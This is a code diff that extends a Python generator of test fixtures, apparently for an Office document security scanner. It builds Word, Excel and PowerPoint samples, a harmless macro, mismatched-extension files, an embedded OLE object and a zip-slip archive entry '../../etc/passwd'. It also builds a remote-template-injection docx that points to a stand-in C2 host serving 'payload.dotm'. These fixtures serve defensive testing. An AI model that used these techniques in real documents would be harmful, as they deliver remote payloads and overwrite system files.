@@ -21,14 +21,23 @@ def create_minimal_openxml(target_path: Path, vba_code: str = None, is_excel: bo
     Create a valid minimal OpenXML document (.docm or .xlsm).
     If vba_code is provided, embeds a minimal vbaProject.bin with harmless macro.
     """
-    target_path.parent.mkdir(parents=True, exist_ok=True)
+    if is_excel:
+        return create_minimal_xlsx(target_path, vba_code=vba_code)
+    else:
+        return create_minimal_docx(target_path, vba_code=vba_code, is_macro=bool(vba_code))
 
-    content_types_word = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+
+def create_minimal_docx(target_path: Path, vba_code: str = None, is_macro: bool = False) -> Path:
+    """Create a valid minimal Word OpenXML document (.docx or .docm)."""
+    target_path.parent.mkdir(parents=True, exist_ok=True)
+    doc_type = "macroEnabled.main" if is_macro else "main"
+
+    content_types = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
     <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
     <Default Extension="xml" ContentType="application/xml"/>
-    <Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>
-    <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>
+    {"<Default Extension=\"bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>" if vba_code else ""}
+    <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.{doc_type}+xml"/>
     <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
     <Override PartName="/docProps/app.xml" ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>
 </Types>"""
@@ -50,21 +59,184 @@ def create_minimal_openxml(target_path: Path, vba_code: str = None, is_excel: bo
 
     doc_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
-    <w:body><w:p><w:r><w:t>Harmless Test Sample</w:t></w:r></w:p></w:body>
+    <w:body><w:p><w:r><w:t>Harmless Word Test Sample</w:t></w:r></w:p></w:body>
 </w:document>"""
 
+    pkg_rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
+</Relationships>"""
+
     with zipfile.ZipFile(target_path, "w", zipfile.ZIP_DEFLATED) as z:
-        z.writestr("[Content_Types].xml", content_types_word)
+        z.writestr("[Content_Types].xml", content_types)
+        z.writestr("_rels/.rels", pkg_rels)
         z.writestr("docProps/core.xml", core_xml)
         z.writestr("docProps/app.xml", app_xml)
         z.writestr("word/document.xml", doc_xml)
-
         if vba_code:
-            # Create a synthetic vbaProject.bin with VBA-like stream
             vba_bin = create_minimal_vba_bin(vba_code)
             z.writestr("word/vbaProject.bin", vba_bin)
 
     return target_path
+
+
+def create_minimal_xlsx(target_path: Path, vba_code: str = None) -> Path:
+    """Create a valid minimal Excel OpenXML workbook (.xlsx or .xlsm)."""
+    target_path.parent.mkdir(parents=True, exist_ok=True)
+    doc_type = "macroEnabled.main" if vba_code else "sheet.main"
+
+    content_types = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+    <Default Extension="xml" ContentType="application/xml"/>
+    {"<Default Extension=\"bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>" if vba_code else ""}
+    <Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.{doc_type}+xml"/>
+    <Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
+    <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
+</Types>"""
+
+    core_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
+    xmlns:dc="http://purl.org/dc/elements/1.1/">
+    <dc:title>Benign Test Excel Workbook</dc:title>
+    <dc:creator>Security Analyst</dc:creator>
+</cp:coreProperties>"""
+
+    wb_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+    <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></sheets>
+</workbook>"""
+
+    sheet_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
+    <sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Benign Excel Data</t></is></c></row></sheetData>
+</worksheet>"""
+
+    pkg_rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
+</Relationships>"""
+
+    with zipfile.ZipFile(target_path, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("[Content_Types].xml", content_types)
+        z.writestr("_rels/.rels", pkg_rels)
+        z.writestr("docProps/core.xml", core_xml)
+        z.writestr("xl/workbook.xml", wb_xml)
+        z.writestr("xl/worksheets/sheet1.xml", sheet_xml)
+        if vba_code:
+            vba_bin = create_minimal_vba_bin(vba_code)
+            z.writestr("xl/vbaProject.bin", vba_bin)
+
+    return target_path
+
+
+def create_minimal_pptx(target_path: Path, vba_code: str = None) -> Path:
+    """Create a valid minimal PowerPoint OpenXML presentation (.pptx or .pptm)."""
+    target_path.parent.mkdir(parents=True, exist_ok=True)
+    doc_type = "macroEnabled.main" if vba_code else "presentation.main"
+
+    content_types = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+    <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+    <Default Extension="xml" ContentType="application/xml"/>
+    {"<Default Extension=\"bin\" ContentType=\"application/vnd.ms-office.vbaProject\"/>" if vba_code else ""}
+    <Override PartName="/ppt/presentation.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.{doc_type}+xml"/>
+    <Override PartName="/ppt/slides/slide1.xml" ContentType="application/vnd.openxmlformats-officedocument.presentationml.slide+xml"/>
+    <Override PartName="/docProps/core.xml" ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
+</Types>"""
+
+    core_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
+    xmlns:dc="http://purl.org/dc/elements/1.1/">
+    <dc:title>Benign Test PowerPoint Presentation</dc:title>
+    <dc:creator>Security Analyst</dc:creator>
+</cp:coreProperties>"""
+
+    pres_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+    <p:sldIdLst><p:sldId id="256" r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/></p:sldIdLst>
+</p:presentation>"""
+
+    slide_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
+    <p:cSld><p:spTree><p:nvGrpSpPr><p:cNvPr id="1" name=""/><p:cNvGrpSpPr/><p:nvPr/></p:nvGrpSpPr><p:grpSpPr/></p:spTree></p:cSld>
+</p:sld>"""
+
+    pkg_rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+    <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="ppt/presentation.xml"/>
+</Relationships>"""
+
+    with zipfile.ZipFile(target_path, "w", zipfile.ZIP_DEFLATED) as z:
+        z.writestr("[Content_Types].xml", content_types)
+        z.writestr("_rels/.rels", pkg_rels)
+        z.writestr("docProps/core.xml", core_xml)
+        z.writestr("ppt/presentation.xml", pres_xml)
+        z.writestr("ppt/slides/slide1.xml", slide_xml)
+        if vba_code:
+            vba_bin = create_minimal_vba_bin(vba_code)
+            z.writestr("ppt/vbaProject.bin", vba_bin)
+
+    return target_path
+
+
+def create_minimal_ppt(target_path: Path) -> Path:
+    """Create a minimal legacy OLE PowerPoint presentation (.ppt)."""
+    return create_minimal_ole(target_path, b"PowerPoint Binary Presentation Stream", "PowerPoint Document")
+
+
+def create_docx_with_external_rel(target_path: Path, target_url: str = "http://malicious-c2.com/payload.dotm", is_template: bool = True) -> Path:
+    """Create a .docx file containing an external relationship (e.g. remote template injection)."""
+    create_minimal_docx(target_path)
+    rel_type = (
+        "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
+        if is_template
+        else "http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink"
+    )
+    doc_rels = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+    <Relationship Id="rIdExternal" Type="{rel_type}" Target="{target_url}" TargetMode="External"/>
+</Relationships>"""
+
+    # Add word/_rels/document.xml.rels into the zip
+    temp_zip = target_path.with_suffix(".tmp")
+    with zipfile.ZipFile(target_path, "r") as zin:
+        with zipfile.ZipFile(temp_zip, "w", zipfile.ZIP_DEFLATED) as zout:
+            for item in zin.infolist():
+                zout.writestr(item, zin.read(item.filename))
+            zout.writestr("word/_rels/document.xml.rels", doc_rels)
+    temp_zip.replace(target_path)
+    return target_path
+
+
+def create_docx_with_embedded_ole(target_path: Path) -> Path:
+    """Create a .docx file with an embedded OLE object in word/embeddings/."""
+    create_minimal_docx(target_path)
+    embedded_bytes = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1\x00\x00EMBEDDED_PAYLOAD_TEST"
+
+    temp_zip = target_path.with_suffix(".tmp")
+    with zipfile.ZipFile(target_path, "r") as zin:
+        with zipfile.ZipFile(temp_zip, "w", zipfile.ZIP_DEFLATED) as zout:
+            for item in zin.infolist():
+                zout.writestr(item, zin.read(item.filename))
+            zout.writestr("word/embeddings/oleObject1.bin", embedded_bytes)
+    temp_zip.replace(target_path)
+    return target_path
+
+
+def create_mismatched_file(target_path: Path, actual_type: str = "OLE") -> Path:
+    """Create a file with an extension that does not match its internal structure."""
+    if actual_type == "OLE":
+        # Create an OLE file with e.g. .docx extension
+        return create_minimal_ole(target_path, b"WordDocument stream", "WordDocument")
+    elif actual_type == "EXCEL_IN_WORD":
+        # Create an Excel OpenXML workbook with .docx extension
+        return create_minimal_xlsx(target_path)
+    elif actual_type == "WORD_IN_EXCEL":
+        # Create a Word OpenXML document with .xlsx extension
+        return create_minimal_docx(target_path)
+    else:
+        return create_minimal_docx(target_path)
 
 
 def create_minimal_vba_bin(vba_source: str) -> bytes:
@@ -203,7 +375,7 @@ def create_minimal_ole(target_path: Path, stream_data: bytes = b"Benign OLE Cont
 
 
 def generate_all_fixtures() -> Dict[str, Path]:
-    """Generate the full set of 10 test fixtures required for testing."""
+    """Generate the full set of test fixtures required for multi-format testing."""
     fixtures = {}
     SAMPLE_DIR.mkdir(parents=True, exist_ok=True)
 
@@ -215,41 +387,62 @@ def generate_all_fixtures() -> Dict[str, Path]:
 
     # 3. Valid Benign OpenXML without macros (.docx or .docm without vba)
     fixtures["docm_nomacro"] = create_minimal_openxml(SAMPLE_DIR / "sample_clean.docm")
+    fixtures["valid_docx"] = create_minimal_docx(SAMPLE_DIR / "sample_clean.docx")
 
-    # 4. Valid XLSM without macros
+    # 4. Valid XLSM & XLSX without macros
     fixtures["xlsm_nomacro"] = create_minimal_openxml(SAMPLE_DIR / "sample_clean.xlsm", is_excel=True)
+    fixtures["valid_xlsx"] = create_minimal_xlsx(SAMPLE_DIR / "sample_clean.xlsx")
 
-    # 5. Document with a harmless VBA macro
+    # 5. PowerPoint formats
+    fixtures["valid_ppt"] = create_minimal_ppt(SAMPLE_DIR / "sample_benign.ppt")
+    fixtures["valid_pptx"] = create_minimal_pptx(SAMPLE_DIR / "sample_clean.pptx")
+
+    # 6. Documents with harmless VBA macros
     harmless_vba = """Sub Document_Open()
     MsgBox "Hello World - Benign Macro"
 End Sub"""
     fixtures["docm_harmless_vba"] = create_minimal_openxml(SAMPLE_DIR / "sample_harmless_macro.docm", vba_code=harmless_vba)
+    fixtures["pptm_harmless_vba"] = create_minimal_pptx(SAMPLE_DIR / "sample_harmless_macro.pptm", vba_code=harmless_vba)
 
-    # 6. Corrupt document
+    # 7. Document with remote template relationship
+    fixtures["docx_remote_template"] = create_docx_with_external_rel(
+        SAMPLE_DIR / "sample_remote_template.docx",
+        target_url="http://malicious-c2.attacker.com/payload.dotm",
+        is_template=True
+    )
+
+    # 8. Document with embedded OLE object
+    fixtures["docx_embedded_ole"] = create_docx_with_embedded_ole(SAMPLE_DIR / "sample_embedded_ole.docx")
+
+    # 9. Renamed / Mismatched documents
+    fixtures["docx_mismatched_ole"] = create_mismatched_file(SAMPLE_DIR / "sample_ole_as_docx.docx", actual_type="OLE")
+    fixtures["xlsx_mismatched_word"] = create_mismatched_file(SAMPLE_DIR / "sample_word_as_xlsx.xlsx", actual_type="WORD_IN_EXCEL")
+
+    # 10. Corrupt document
     corrupt_file = SAMPLE_DIR / "sample_corrupt.doc"
     with open(corrupt_file, "wb") as f:
         f.write(b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1CORRUPT_BYTES_TRUNCATED")
     fixtures["corrupt_doc"] = corrupt_file
 
-    # 7. Empty file
+    # 11. Empty file
     empty_file = SAMPLE_DIR / "sample_empty.docm"
     with open(empty_file, "wb") as f:
         pass
     fixtures["empty_file"] = empty_file
 
-    # 8. Unsupported file
+    # 12. Unsupported file
     unsupported_file = SAMPLE_DIR / "sample_unsupported.txt"
     with open(unsupported_file, "w") as f:
         f.write("This is a plain text file, not an Office document.")
     fixtures["unsupported_file"] = unsupported_file
 
-    # 9. Malformed ZIP archive
+    # 13. Malformed ZIP archive
     bad_zip = SAMPLE_DIR / "sample_bad_archive.docm"
     with open(bad_zip, "wb") as f:
         f.write(b"\x50\x4B\x03\x04BAD_ZIP_BODY_TRUNCATED")
     fixtures["malformed_zip"] = bad_zip
 
-    # 10. Zip slip fixture
+    # 14. Zip slip fixture
     slip_zip = SAMPLE_DIR / "sample_zip_slip.docm"
     with zipfile.ZipFile(slip_zip, "w") as z:
         z.writestr("../../etc/passwd", "malicious_content")
